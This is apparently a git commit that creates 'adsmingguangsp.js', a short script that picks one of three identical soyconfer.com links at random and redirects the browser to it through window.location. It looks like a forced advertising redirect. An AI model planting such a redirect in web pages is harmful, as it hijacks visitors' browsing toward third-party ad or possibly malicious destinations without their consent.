ae6a48866e4fdb1d4f6de3801b271ed0a41bcdd7
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-02-11 16:05:55 +0700

    Create adsmingguangsp.js

---
+++ adsmingguangsp.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+
+'https://soyconfer.com/aq82pi7u?key=c0beff9c2eb965a7be4e6c81970362e0',
+
+'https://soyconfer.com/aq82pi7u?key=c0beff9c2eb965a7be4e6c81970362e0',
+
+'https://soyconfer.com/aq82pi7u?key=c0beff9c2eb965a7be4e6c81970362e0'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
